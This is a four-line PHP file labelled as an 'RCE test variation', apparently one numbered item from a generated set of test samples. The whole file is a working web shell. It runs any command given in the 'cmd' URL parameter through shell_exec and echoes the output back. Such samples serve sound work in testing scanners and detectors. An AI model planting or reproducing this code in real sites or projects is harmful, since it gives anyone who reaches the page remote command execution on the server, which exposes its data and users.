<?php
// RCE test variation #1482
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>